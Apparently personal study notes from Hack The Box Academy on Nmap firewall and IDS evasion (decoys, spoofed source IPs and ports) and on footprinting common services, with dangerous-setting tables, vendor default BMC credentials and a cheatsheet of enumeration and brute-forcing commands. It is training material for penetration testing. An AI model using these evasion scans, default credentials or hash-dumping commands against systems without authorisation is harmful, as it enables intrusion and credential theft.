There are cases in which administrators block specific subnets from different regions in principle. This prevents any access to the target network. Another example is when IPS should block us. For this reason, the Decoy scanning method (-D) is the right choice. With this method, Nmap generates various random IP addresses inserted into the IP header to disguise the origin of the packet sent. With this method, we can generate random (RND) a specific number (for example: 5) of IP addresses separated by a colon (:). Our real IP address is then randomly placed between the generated IP addresses. In the next example, our real IP address is therefore placed in the second position. Another critical point is that the decoys must be alive. Otherwise, the service on the target may be unreachable due to SYN-flooding security mechanisms.

**Random Source IPs**

```sh
woadey@htb[/htb]$ sudo nmap 10.129.2.28 -p 80 -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5

Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-21 16:14 CEST
SENT (0.0378s) TCP 102.52.161.59:59289 > 10.129.2.28:80 S ttl=42 id=29822 iplen=44  seq=3687542010 win=1024 <mss 1460>
SENT (0.0378s) TCP 10.10.14.2:59289 > 10.129.2.28:80 S ttl=59 id=29822 iplen=44  seq=3687542010 win=1024 <mss 1460>
SENT (0.0379s) TCP 210.120.38.29:59289 > 10.129.2.28:80 S ttl=37 id=29822 iplen=44  seq=3687542010 win=1024 <mss 1460>
SENT (0.0379s) TCP 191.6.64.171:59289 > 10.129.2.28:80 S ttl=38 id=29822 iplen=44  seq=3687542010 win=1024 <mss 1460>
SENT (0.0379s) TCP 184.178.194.209:59289 > 10.129.2.28:80 S ttl=39 id=29822 iplen=44  seq=3687542010 win=1024 <mss 1460>
SENT (0.0379s) TCP 43.21.121.33:59289 > 10.129.2.28:80 S ttl=55 id=29822 iplen=44  seq=3687542010 win=1024 <mss 1460>
RCVD (0.1370s) TCP 10.129.2.28:80 > 10.10.14.2:59289 SA ttl=64 id=0 iplen=44  seq=4056111701 win=64240 <mss 1460>
Nmap scan report for 10.129.2.28
Host is up (0.099s latency).

PORT   STATE SERVICE
80/tcp open  http
MAC Address: DE:AD:00:00:BE:EF (Intel Corporate)

Nmap done: 1 IP address (1 host up) scanned in 0.15 seconds
```

| Scanning Options     | Description                                                                                |
| -------------------- | ------------------------------------------------------------------------------------------ |
| `10.129.2.28`        | Scans the specified target.                                                                |
| `-p 80`              | Scans only the specified ports.                                                            |
| `-sS`                | Performs SYN scan on specified ports.                                                      |
| `-Pn`                | Disables ICMP Echo requests.                                                               |
| `-n`                 | Disables DNS resolution.                                                                   |
| `--disable-arp-ping` | Disables ARP ping.                                                                         |
| `--packet-trace`     | Shows all packets sent and received.                                                       |
| `-D RND:5`           | Generates five random IP addresses that indicates the source IP the connection comes from. |

**Specified Source IP**

```sh
woadey@htb[/htb]$ sudo nmap 10.129.2.28 -n -Pn -p 445 -O -S 10.129.2.200 -e tun0

Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-22 01:16 CEST
Nmap scan report for 10.129.2.28
Host is up (0.010s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: DE:AD:00:00:BE:EF (Intel Corporate)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.4 - 3.10 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Synology DiskStation Manager 5.2-5644 (94%), Linux 2.6.32 - 2.6.35 (94%), Linux 2.6.32 - 3.5 (94%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 4.11 seconds
```

| Scanning Options | Description                                            |
| ---------------- | ------------------------------------------------------ |
| `10.129.2.28`    | Scans the specified target.                            |
| `-n`             | Disables DNS resolution.                               |
| `-Pn`            | Disables ICMP Echo requests.                           |
| `-p 445`         | Scans only the specified ports.                        |
| `-O`             | Performs operation system detection scan.              |
| `-S`             | Scans the target by using different source IP address. |
| `10.129.2.200`   | Specifies the source IP address.                       |
| `-e tun0`        | Sends all requests through the specified interface.    |

**Specified Source Port**

```sh
woadey@htb[/htb]$ sudo nmap 10.129.2.28 -p50000 -sS -Pn -n --disable-arp-ping --packet-trace --source-port 53

SENT (0.0482s) TCP 10.10.14.2:53 > 10.129.2.28:50000 S ttl=58 id=27470 iplen=44  seq=4003923435 win=1024 <mss 1460>
RCVD (0.0608s) TCP 10.129.2.28:50000 > 10.10.14.2:53 SA ttl=64 id=0 iplen=44  seq=540635485 win=64240 <mss 1460>
Nmap scan report for 10.129.2.28
Host is up (0.013s latency).

PORT      STATE SERVICE
50000/tcp open  ibm-db2
MAC Address: DE:AD:00:00:BE:EF (Intel Corporate)

Nmap done: 1 IP address (1 host up) scanned in 0.08 seconds
```

| Scanning Options     | Description                                    |
| -------------------- | ---------------------------------------------- |
| `10.129.2.28`        | Scans the specified target.                    |
| `-p 50000`           | Scans only the specified ports.                |
| `-sS`                | Performs SYN scan on specified ports.          |
| `-Pn`                | Disables ICMP Echo requests.                   |
| `-n`                 | Disables DNS resolution.                       |
| `--disable-arp-ping` | Disables ARP ping.                             |
| `--packet-trace`     | Shows all packets sent and received.           |
| `--source-port 53`   | Performs the scans from specified source port. |

### Complete

[Link Of Completion](https://academy.hackthebox.com/achievement/713396/19)

&nbsp;

---

&nbsp;

## Footprinting

### Enumeration Principles

| No. | Principle                                                              |
| --- | ---------------------------------------------------------------------- |
| 1.  | There is more than meets the eye. Consider all points of view.         |
| 2.  | Distinguish between what we see and what we do not see.                |
| 3.  | There are always ways to gain more information. Understand the target. |

**Enumermation Questions**

- What can we see?
- What reasons can we have for seeing it?
- What image does what we see create for us?
- What do we gain from it?
- How can we use it?
- What can we not see?
- What reasons can there be that we do not see?
- What image results for us from what we do not see?

### Enumeration Methodology

![methods](images/enum-method.png)

| Layer                  | Description                                                                                            | Information Categories                                                                             |
| ---------------------- | ------------------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------- |
| 1. Internet Presence   | Identification of internet presence and externally accessible infrastructure.                          | Domains, Subdomains, vHosts, ASN, Netblocks, IP Addresses, Cloud Instances, Security Measures      |
| 2. Gateway             | Identify the possible security measures to protect the company's external and internal infrastructure. | Firewalls, DMZ, IPS/IDS, EDR, Proxies, NAC, Network Segmentation, VPN, Cloudflare                  |
| 3. Accessible Services | Identify accessible interfaces and services that are hosted externally or internally.                  | Service Type, Functionality, Configuration, Port, Version, Interface                               |
| 4. Processes           | Identify the internal processes, sources, and destinations associated with the services.               | PID, Processed Data, Tasks, Source, Destination                                                    |
| 5. Privileges          | Identification of the internal permissions and privileges to the accessible services.                  | Groups, Users, Permissions, Restrictions, Environment                                              |
| 6. OS Setup            | Identification of the internal components and systems setup.                                           | OS Type, Patch Level, Network config, OS Environment, Configuration files, sensitive private files |

### FTP

FTP, or File Transfer Protocol, is a standard network protocol used for the transfer of files between a client and server on a computer network. The FTP runs within the application layer of the TCP/IP protocol stack. It's built on a client-server model architecture and uses separate control and data connections between the client and the server.

**Ports**

- 20 (TCP): Data transfer port (Active Mode).
- 21 (TCP): Command/control port (used for connecting to the FTP server).

**vsFTPd**
| Setting | Description |
| ------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------- |
| `listen=NO` | Run from inetd or as a standalone daemon? |
| `listen_ipv6=YES` | Listen on IPv6 ? |
| `anonymous_enable=NO` | Enable Anonymous access? |
| `local_enable=YES` | Allow local users to login? |
| `dirmessage_enable=YES` | Display active directory messages when users go into certain directories? |
| `use_localtime=YES` | Use local time? |
| `xferlog_enable=YES` | Activate logging of uploads/downloads? |
| `connect_from_port_20=YES` | Connect from port 20? |
| `secure_chroot_dir=/var/run/vsftpd/empty` | Name of an empty directory |
| `pam_service_name=vsftpd` | This string is the name of the PAM service vsftpd will use. |
| `rsa_cert_file=/etc/ssl/certs/ssl-cert-snakeoil.pem` | The last three options specify the location of the RSA certificate to use for SSL encrypted connections. |
| `rsa_private_key_file=/etc/ssl/private/ssl-cert-snakeoil.key` | |
| `ssl_enable=NO` | |

**Dangerous Settings**
| Setting | Description |
| ------------------------------ | ---------------------------------------------------------------------------------- |
| `anonymous_enable=YES` | Allowing anonymous login? |
| `anon_upload_enable=YES` | Allowing anonymous to upload files? |
| `anon_mkdir_write_enable=YES` | Allowing anonymous to create new directories? |
| `no_anon_password=YES` | Do not ask anonymous for password? |
| `anon_root=/home/username/ftp` | Directory for anonymous. |
| `write_enable=YES` | Allow the usage of FTP commands: STOR, DELE, RNFR, RNTO, MKD, RMD, APPE, and SITE? |

### SMB

SMB, or Server Message Block, is a network file sharing protocol that allows applications on a computer to read and write to files and request services from server programs in a computer network. SMB is used to enable access to files, printers, and other shared resources on a network.

**Ports**

- 137 (UDP): Used for NetBIOS name service.
- 138 (UDP): Used for NetBIOS datagram service.
- 139 (TCP/UDP): Used for SMB over NetBIOS (a legacy protocol).
- 445 (TCP/UDP): Used for SMB over TCP/IP (CIFS only uses port 445)

**smb.conf**
| Setting | Description |
| ------------------------------ | --------------------------------------------------------------------- |
| `[sharename]` | The name of the network share. |
| `workgroup = WORKGROUP/DOMAIN` | Workgroup that will appear when clients query. |
| `path = /path/here/` | The directory to which user is to be given access. |
| `server string = STRING` | The string that will show up when a connection is initiated. |
| `unix password sync = yes` | Synchronize the UNIX password with the SMB password? |
| `usershare allow guests = yes` | Allow non-authenticated users to access defined share? |
| `map to guest = bad user` | What to do when a user login request doesn't match a valid UNIX user? |
| `browseable = yes` | Should this share be shown in the list of available shares? |
| `guest ok = yes` | Allow connecting to the service without using a password? |
| `read only = yes` | Allow users to read files only? |
| `create mask = 0700` | What permissions need to be set for newly created files? |

**Dangerous Settings**
| Setting | Description |
| --------------------------- | ------------------------------------------------------------------- |
| `browseable = yes` | Allow listing available shares in the current share? |
| `read only = no` | Forbid the creation and modification of files? |
| `writable = yes` | Allow users to create and modify files? |
| `guest ok = yes` | Allow connecting to the service without using a password? |
| `enable privileges = yes` | Honor privileges assigned to specific SID? |
| `create mask = 0777` | What permissions must be assigned to the newly created files? |
| `directory mask = 0777` | What permissions must be assigned to the newly created directories? |
| `logon script = script.sh` | What script needs to be executed on the user's login? |
| `magic script = script.sh` | Which script should be executed when the script gets closed? |
| `magic output = script.out` | Where the output of the magic script needs to be stored? |

**SMB Tools**

- smbclient
- RPCclient
- Samrdump.py (Impacket)
- SMBmap
- CrackMapExec
- Enum4Linux-ng

### NFS

Network File System (NFS) is a network file system developed by Sun Microsystems and has the same purpose as SMB. Its purpose is to access file systems over a network as if they were local. However, it uses an entirely different protocol. NFS is used between Linux and Unix systems. This means that NFS clients cannot communicate directly with SMB servers. NFS is an Internet standard that governs the procedures in a distributed file system.

| Version | Features                                                                                                                                                                                                                                                             |
| ------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| NFSv2   | It is older but is supported by many systems and was initially operated entirely over UDP.                                                                                                                                                                           |
| NFSv3   | It has more features, including variable file size and better error reporting, but is not fully compatible with NFSv2 clients.                                                                                                                                       |
| NFSv4   | It includes Kerberos, works through firewalls and on the Internet, no longer requires portmappers, supports ACLs, applies state-based operations, and provides performance improvements and high security. It is also the first version to have a stateful protocol. |

**Ports**

- 111 (TCP): RPCbind/Portmapper
- 2049 (TCP/UDP): This is the primary port used by NFS servers for client-server communication.

**/etc/exports**
| Option | Description |
| ------------------ | ----------------------------------------------------------------------------------------------------------------------------------------- |
| `rw` | Read and write permissions. |
| `ro` | Read only permissions. |
| `sync` | Synchronous data transfer. (A bit slower) |
| `async` | Asynchronous data transfer. (A bit faster) |
| `secure` | Ports above 1024 will not be used. |
| `insecure` | Ports above 1024 will be used. |
| `no_subtree_check` | This option disables the checking of subdirectory trees. |
| `root_squash` | Assigns all permissions to files of root UID/GID 0 to the UID/GID of anonymous, which prevents root from accessing files on an NFS mount. |

**Dangerous Settings**
| Option | Description |
| ---------------- | -------------------------------------------------------------------------------------------------------------------- |
| `rw` | Read and write permissions. |
| `insecure` | Ports above 1024 will be used. |
| `nohide` | If another file system was mounted below an exported directory, this directory is exported by its own exports entry. |
| `no_root_squash` | All files created by root are kept with the UID/GID 0. |

**Show Mount**

```sh
woadey@htb[/htb]$ showmount -e 10.129.14.128

Export list for 10.129.14.128:
/mnt/nfs 10.129.14.0/24
```

**Mount NFS Share**

```sh
woadey@htb[/htb]$ mkdir target-NFS
woadey@htb[/htb]$ sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock
woadey@htb[/htb]$ cd target-NFS
woadey@htb[/htb]$ tree .

.
└── mnt
    └── nfs
        ├── id_rsa
        ├── id_rsa.pub
        └── nfs.share

2 directories, 3 files
```

**Unmounting**

```sh
woadey@htb[/htb]$ sudo umount ./target-NFS
```

### DNS

DNS, or Domain Name System, is a hierarchical and decentralized naming system for computers, services, or other resources connected to the Internet or a private network. It translates more readily memorized domain names to the numerical IP addresses needed for locating and identifying computer services and devices with the underlying network protocols.

**Ports**

- 53 (TCP/UDP): The primary port used by DNS servers.

| Server Type                  | Description                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| ---------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| DNS Root Server              | The root servers of the DNS are responsible for the top-level domains (TLD). As the last instance, they are only requested if the name server does not respond. Thus, a root server is a central interface between users and content on the Internet, as it links domain and IP address. The Internet Corporation for Assigned Names and Numbers (ICANN) coordinates the work of the root name servers. There are 13 such root servers around the globe. |
| Authoritative Nameserver     | Authoritative name servers hold authority for a particular zone. They only answer queries from their area of responsibility, and their information is binding. If an authoritative name server cannot answer a client's query, the root name server takes over at that point.                                                                                                                                                                            |
| Non-authoritative Nameserver | Non-authoritative name servers are not responsible for a particular DNS zone. Instead, they collect information on specific DNS zones themselves, which is done using recursive or iterative DNS querying.                                                                                                                                                                                                                                               |
| Caching DNS Server           | Caching DNS servers cache information from other name servers for a specified period. The authoritative name server determines the duration of this storage.                                                                                                                                                                                                                                                                                             |
| Forwarding Server            | Forwarding servers perform only one function: they forward DNS queries to another DNS server.                                                                                                                                                                                                                                                                                                                                                            |
| Resolver                     | Resolvers are not authoritative DNS servers but perform name resolution locally in the computer or router.                                                                                                                                                                                                                                                                                                                                               |

![dns](images/dns.png)

| DNS Record | Description                                                                                                                                                                                                                                       |
| ---------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| A          | Returns an IPv4 address of the requested domain as a result.                                                                                                                                                                                      |
| AAAA       | Returns an IPv6 address of the requested domain.                                                                                                                                                                                                  |
| MX         | Returns the responsible mail servers as a result.                                                                                                                                                                                                 |
| NS         | Returns the DNS servers (nameservers) of the domain.                                                                                                                                                                                              |
| TXT        | This record can contain various information. The all-rounder can be used, e.g., to validate the Google Search Console or validate SSL certificates. In addition, SPF and DMARC entries are set to validate mail traffic and protect it from spam. |
| CNAME      | This record serves as an alias. If the domain <www.hackthebox.eu> should point to the same IP, and we create an A record for one and a CNAME record for the other.                                                                                |
| PTR        | The PTR record works the other way around (reverse lookup). It converts IP addresses into valid domain names.                                                                                                                                     |
| SOA        | Provides information about the corresponding DNS zone and email address of the administrative contact.                                                                                                                                            |

**DNS Tools**

- dnsenum
- dig

#### SMTP

The Simple Mail Transfer Protocol (SMTP) is a protocol for sending emails in an IP network. It can be used between an email client and an outgoing mail server or between two SMTP servers. SMTP is often combined with the IMAP or POP3 protocols, which can fetch emails and send emails. In principle, it is a client-server-based protocol, although SMTP can be used between a client and a server and between two SMTP servers.

**Ports**

- 25 (TCP): This is the default SMTP non-encrypted port. It's widely used for SMTP relaying and communication between mail servers.
- 587 (TCP): Recommended for SMTP submission, especially for clients sending emails to a server. It supports STARTTLS, allowing encryption.
- 465 (TCP): Originally intended for SMTPS (SMTP over SSL), but was never standardized. Some systems still use it for SMTP with SSL/TLS encryption from the start of the connection.

| Command      | Description                                                                                      |
| ------------ | ------------------------------------------------------------------------------------------------ |
| `AUTH PLAIN` | AUTH is a service extension used to authenticate the client.                                     |
| `HELO`       | The client logs in with its computer name and thus starts the session.                           |
| `MAIL FROM`  | The client names the email sender.                                                               |
| `RCPT TO`    | The client names the email recipient.                                                            |
| `DATA`       | The client initiates the transmission of the email.                                              |
| `RSET`       | The client aborts the initiated transmission but keeps the connection between client and server. |
| `VRFY`       | The client checks if a mailbox is available for message transfer.                                |
| `EXPN`       | The client also checks if a mailbox is available for messaging with this command.                |
| `NOOP`       | The client requests a response from the server to prevent disconnection due to time-out.         |
| `QUIT`       | The client terminates the session.                                                               |

**SMTP Tools**

- smtp-user-enum
- telnet

### IMAP / POP3

With the help of the Internet Message Access Protocol (IMAP), access to emails from a mail server is possible. Unlike the Post Office Protocol (POP3), IMAP allows online management of emails directly on the server and supports folder structures. Thus, it is a network protocol for the online management of emails on a remote server. The protocol is client-server-based and allows synchronization of a local email client with the mailbox on the server, providing a kind of network file system for emails, allowing problem-free synchronization across several independent clients. POP3, on the other hand, does not have the same functionality as IMAP, and it only provides listing, retrieving, and deleting emails as functions at the email server. Therefore, protocols such as IMAP must be used for additional functionalities such as hierarchical mailboxes directly at the mail server, access to multiple mailboxes during a session, and preselection of emails.

**Ports**

- 110 (TCP): POP3 (Standard) Used for retrieving emails with the Post Office Protocol version 3 (POP3) in a non-encrypted form.
- 143 (TCP): IMAP (Standard) Utilized for accessing emails using the Internet Message Access Protocol (IMAP) without encryption.
- 993 (TCP): IMAP over SSL/TLS (Secure) For accessing emails via IMAP securely using SSL/TLS encryption.
- 995 (TCP): POP3 over SSL/TLS (Secure) Used for secure email retrieval using POP3 with SSL/TLS encryption.

**IMAP Tools**

- evolution
- curl
- openssl

### SNMP

Simple Network Management Protocol (SNMP) is a widely used protocol for managing devices on IP networks. It's used for collecting information from, and configuring, network devices such as servers, printers, switches, routers, and more.

**Ports**

- 161 (UDP): The main port used by SNMP for sending and receiving requests.
- 162 (UDP): This port is used for SNMP traps. Traps are alerts or notifications sent from an SNMP-enabled device to a management station.

**MIB**

To ensure that SNMP access works across manufacturers and with different client-server combinations, the Management Information Base (MIB) was created. MIB is an independent format for storing device information. A MIB is a text file in which all queryable SNMP objects of a device are listed in a standardized tree hierarchy. It contains at least one Object Identifier (OID), which, in addition to the necessary unique address and a name, also provides information about the type, access rights, and a description of the respective object. MIB files are written in the Abstract Syntax Notation One (ASN.1) based ASCII text format. The MIBs do not contain data, but they explain where to find which information and what it looks like, which returns values for the specific OID, or which data type is used.

**OID**

An OID represents a node in a hierarchical namespace. A sequence of numbers uniquely identifies each node, allowing the node's position in the tree to be determined. The longer the chain, the more specific the information. Many nodes in the OID tree contain nothing except references to those below them. The OIDs consist of integers and are usually concatenated by dot notation.

**Dangerous Settings**
| Settings | Description |
| -------------------------------------------------- | ------------------------------------------------------------------------------------- |
| rwuser noauth | Provides access to the full OID tree without authentication. |
| rwcommunity \<community string\> \<IPv4 address\> | Provides access to the full OID tree regardless of where the requests were sent from. |
| rwcommunity6 \<community string\> \<IPv6 address\> | Same access as with rwcommunity with the difference of using IPv6. |

**SNMP Tools**

- SNMPwalk
- OneSixtyOne
- Braa

### MySQL

MySQL is a popular open-source relational database management system (RDBMS). It's widely used for a variety of applications, from small personal projects to large enterprise systems.

**Ports**

- 3306 (TCP): This is the default port used by MySQL. When a client connects to a MySQL server, it typically uses this port.

**Dangerous Settings**

| Settings         | Description                                                                                                  |
| ---------------- | ------------------------------------------------------------------------------------------------------------ |
| user             | Sets which user the MySQL service will run as.                                                               |
| password         | Sets the password for the MySQL user.                                                                        |
| admin_address    | The IP address on which to listen for TCP/IP connections on the administrative network interface.            |
| debug            | This variable indicates the current debugging settings.                                                      |
| sql_warnings     | This variable controls whether single-row INSERT statements produce an information string if warnings occur. |
| secure_file_priv | This variable is used to limit the effect of data import and export operations.                              |

**Key Commands**
| Command | Description |
| ---------------------------------------------------- | ------------------------------------------------------------------------------------------------- |
| `mysql -u <user> -p<password> -h <IP address>` | Connect to the MySQL server. There should not be a space between the '-p' flag, and the password. |
| `show databases;` | Show all databases. |
| `use <database>;` | Select one of the existing databases. |
| `show tables;` | Show all available tables in the selected database. |
| `show columns from <table>;` | Show all columns in the selected database. |
| `select * from <table>;` | Show everything in the desired table. |
| `select * from <table> where <column> = "<string>";` | Search for needed string in the desired table. |

### MSSQL

Microsoft SQL Server (MSSQL) is a relational database management system developed by Microsoft. It's designed to store, retrieve, and manage data for various software applications.

**Ports**

- 1433 (TCP): Default port for the SQL Server database engine.
- 1434 (TCP): Used for SQL Server named instances and the SQL Server Browser Service.

**Default Databases**
| Default System Database | Description |
| ----------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| master | Tracks all system information for an SQL server instance |
| model | Template database that acts as a structure for every new database created. Any setting changed in the model database will be reflected in any new database created after changes to the model database |
| msdb | The SQL Server Agent uses this database to schedule jobs & alerts |
| tempdb | Stores temporary objects |
| resource | Read-only database containing system objects included with SQL server |

**Tools**

- nmap
- msfconsole (scanner/mssql/mssql_ping)
- mssqlclient.py
- dbeaver

### IPMI

Intelligent Platform Management Interface (IPMI) is a standardized computer system interface used for out-of-band management of computer systems and monitoring of their operation. It allows system administrators to manage systems remotely and monitor system health, even in the absence of an operating system or when the system is powered off. Systems that use the IPMI protocol are called Baseboard Management Controllers (BMCs). Gaining access to a BMC is nearly equivalent to physical access to a system.

**Ports**

- 623 (UDP/TCP): The default port used for IPMI. It's used for remote management and monitoring.

**BMC Default Credentials**
Product Username Password
| Product | Username | Password |
| --------------- | --------------- | ------------------------------------------------------------------------- |
| Dell iDRAC | `root` | `calvin` |
| HP iLO | `Administrator` | randomized 8-character string consisting of numbers and uppercase letters |
| Supermicro IPMI | `ADMIN` | `ADMIN` |

**Tools**

- nmap
- msfconsole (scanner/ipmi/ipmi_version, scanner/ipmi/ipmi_dumphashes)

### SSH

Secure Shell (SSH) is a cryptographic network protocol used for secure data communication, remote command-line login, remote command execution, and other secure network services between two networked computers.

**Ports**

- 22 (TCP): The default port used for SSH connections.

**Dangerous Settings**
| Setting | Description |
| -------------------------- | ------------------------------------------- |
| PasswordAuthentication yes | Allows password-based authentication. |
| PermitEmptyPasswords yes | Allows the use of empty passwords. |
| PermitRootLogin yes | Allows to log in as the root user. |
| Protocol 1 | Uses an outdated version of encryption. |
| X11Forwarding yes | Allows X11 forwarding for GUI applications. |
| AllowTcpForwarding yes | Allows forwarding of TCP ports. |
| PermitTunnel | Allows tunneling. |
| DebianBanner yes | Displays a specific banner when logging in. |

**Tools**

- ssh-audit.py

### Rsync

Rsync is a utility for efficiently transferring and synchronizing files across computer systems, using a data streaming technique to minimize data transfer.

**Ports**

- 873 (TCP/UDP): The default port used for Rsync services.

**Tools**

- nmap
- nc
- rsync

### R-Services

R-Services refers to a suite of services for remote command execution, typically used in UNIX and Linux environments. These include Rlogin, Rsh, and Rexec.

**Ports**

- 514 (TCP/UDP): Used for Rsh (Remote Shell).
- 513 (TCP/UDP): Used for Rlogin (Remote Login).
- 512 (TCP): Used for Rexec (Remote Execution).

**Commands**

| Command  | Service Daemon | Port | Transport Protocol | Description                                                                                                                                                                                                                                                        |
| -------- | -------------- | ---- | ------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `rcp`    | rshd           | 514  | TCP                | Copy a file or directory bidirectionally from the local system to the remote system (or vice versa) or from one remote system to another. It works like the cp command on Linux but provides no warning to the user for overwriting existing files on a system.    |
| `rsh`    | rshd           | 514  | TCP                | Opens a shell on a remote machine without a login procedure. Relies upon the trusted entries in the /etc/hosts.equiv and .rhosts files for validation.                                                                                                             |
| `rexec`  | rexecd         | 512  | TCP                | Enables a user to run shell commands on a remote machine. Requires authentication through the use of a username and password through an unencrypted network socket. Authentication is overridden by the trusted entries in the /etc/hosts.equiv and .rhosts files. |
| `rlogin` | rlogind        | 513  | TCP                | Enables a user to log in to a remote host over the network. It works similarly to telnet but can only connect to Unix-like hosts. Authentication is overridden by the trusted entries in the /etc/hosts.equiv and .rhosts files.                                   |

### RDP

Remote Desktop Protocol (RDP) is a proprietary protocol developed by Microsoft, providing a user with a graphical interface to connect to another computer over a network connection.

**Ports**

- 3389 (TCP/UDP): The default port used for RDP connections.

**RDP Tools**

- nmap
- xfreerdp
- rdesktop
- remmina

### Windows Remote Management (WinRM)

Windows Remote Management (WinRM) is Microsoft's implementation of the WS-Management protocol, a standard web services protocol used for remote software and hardware management.

**Ports**

- 5985 (TCP): Used for HTTP connections.
- 5986 (TCP): Used for HTTPS connections.

**WinRM Tools**

- Test-WsMan
- evil-winrm

### WMI

Windows Management Instrumentation (WMI) is a set of extensions to the Windows Driver Model that provides an operating system interface through which instrumented components provide information and notification.

**Ports**

- 135 (TCP): The default port used for WMI connections.

**WMI Tools**

- wmiexec.py

### Infrastructure-based Enumeration Cheatsheet

| Command                                                             | Description                                  |
| ------------------------------------------------------------------- | -------------------------------------------- |
| `curl -s https://crt.sh/\?q\=<target-domain>\&output\=json \| jq .` | Certificate transparency.                    |
| `for i in $(cat ip-addresses.txt);do shodan host $i;done`           | Scan each IP address in a list using Shodan. |

### Host-based Enumeration Cheatsheet

**FTP**
| Command | Description |
| --------------------------------------------------------- | ----------------------------------------------------------------------- |
| `ftp <FQDN/IP>` | Interact with the FTP service on the target. |
| `nc -nv <FQDN/IP> 21` | Interact with the FTP service on the target. |
| `telnet <FQDN/IP> 21` | Interact with the FTP service on the target. |
| `openssl s_client -connect <FQDN/IP>:21 -starttls ftp` | Interact with the FTP service on the target using encrypted connection. |
| `wget -m --no-passive ftp://anonymous:anonymous@<target>` | Download all available files on the target FTP server. |

**SMB**
| Command | Description |
| ------------------------------------------------- | --------------------------------------------------------- |
| `smbclient -N -L //<FQDN/IP>` | Null session authentication on SMB. |
| `smbclient //<FQDN/IP>/<share>` | Connect to a specific SMB share. |
| `rpcclient -U "" <FQDN/IP>` | Interaction with the target using RPC. |
| `samrdump.py <FQDN/IP>` | Username enumeration using Impacket scripts. |
| `smbmap -H <FQDN/IP>` | Enumerating SMB shares. |
| `crackmapexec smb <FQDN/IP> --shares -u '' -p ''` | Enumerating SMB shares using null session authentication. |
| `enum4linux-ng.py <FQDN/IP> -A` | SMB enumeration using enum4linux. |

**NFS**
| Command | Description |
| --------------------------------------------------------- | ------------------------------------------------ |
| `showmount -e <FQDN/IP>` | Show available NFS shares. |
| `mount -t nfs <FQDN/IP>:/<share> ./target-NFS/ -o nolock` | Mount the specific NFS share.umount ./target-NFS |
| `umount ./target-NFS` | Unmount the specific NFS share. |

**DNS**
| Command | Description |
| ------------------------------------------------------------------------------------------------------------- | ---------------------------------------- |
| `dig ns <domain.tld> @<nameserver>` | NS request to the specific nameserver. |
| `dig any <domain.tld> @<nameserver>` | ANY request to the specific nameserver. |
| `dig axfr <domain.tld> @<nameserver>` | AXFR request to the specific nameserver. |
| `dnsenum --dnsserver <nameserver> --enum -p 0 -s 0 -o found_subdomains.txt -f ~/subdomains.list <domain.tld>` | Subdomain brute forcing. |

**SMTP**
| Command | Description |
| --------------------- | ----------- |
| `telnet <FQDN/IP> 25` | |

**IMAP/POP3**
| Command | Description |
| ------------------------------------------------------ | --------------------------------------- |
| `curl -k 'imaps://<FQDN/IP>' --user <user>:<password>` | Log in to the IMAPS service using cURL. |
| `openssl s_client -connect <FQDN/IP>:imaps` | Connect to the IMAPS service. |
| `openssl s_client -connect <FQDN/IP>:pop3s` | Connect to the POP3s service. |

**SNMP**
| Command | Description |
| ------------------------------------------------- | --------------------------------------------------- |
| `snmpwalk -v2c -c <community string> <FQDN/IP>` | Querying OIDs using snmpwalk. |
| `onesixtyone -c community-strings.list <FQDN/IP>` | Bruteforcing community strings of the SNMP service. |
| `braa <community string>@<FQDN/IP>:.1.*` | Bruteforcing SNMP service OIDs. |

**MySQL**
| Command | Description |
| ------------------------------------------- | -------------------------- |
| `mysql -u <user> -p<password> -h <FQDN/IP>` | Login to the MySQL server. |

**MSSQL**
| Command | Description |
| ----------------------------------------------- | -------------------------------------------------------- |
| `mssqlclient.py <user>@<FQDN/IP> -windows-auth` | Log in to the MSSQL server using Windows authentication. |

**IPMI**
| Command | Description |
| ---------------------------------------------- | ----------------------- |
| `msf6 auxiliary(scanner/ipmi/ipmi_version)` | IPMI version detection. |
| `msf6 auxiliary(scanner/ipmi/ipmi_dumphashes)` | Dump IPMI hashes. |

**Linux Remote Management**
| Command | Description |
| ----------------------------------------------------------- | ----------------------------------------------------- |
| `ssh-audit.py <FQDN/IP>` | Remote security audit against the target SSH service. |
| `ssh <user>@<FQDN/IP>` | Log in to the SSH server using the SSH client. |
| `ssh -i private.key <user>@<FQDN/IP>` | Log in to the SSH server using private key. |
| `ssh <user>@<FQDN/IP> -o PreferredAuthentications=password` | Enforce password-based authentication. |

**Windows Remote Management**
| Command | Description |
| ------------------------------------------------------------- | ----------------------------------------------- |
| `rdp-sec-check.pl <FQDN/IP>` | Check the security settings of the RDP service. |
| `xfreerdp /u:<user> /p:"<password>" /v:<FQDN/IP>` | Log in to the RDP server from Linux. |
| `evil-winrm -i <FQDN/IP> -u <user> -p <password>` | Log in to the WinRM server. |
| `wmiexec.py <user>:"<password>"@<FQDN/IP> "<system command>"` | Execute command using the WMI service. |

**Oracle TNS**
| Command | Description |
| -------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------- |
| `./odat.py all -s <FQDN/IP>` | Perform a variety of scans to gather information about the Oracle database services and its components. |
| `sqlplus <user>/<pass>@<FQDN/IP>/<db>` | Log in to the Oracle database. |
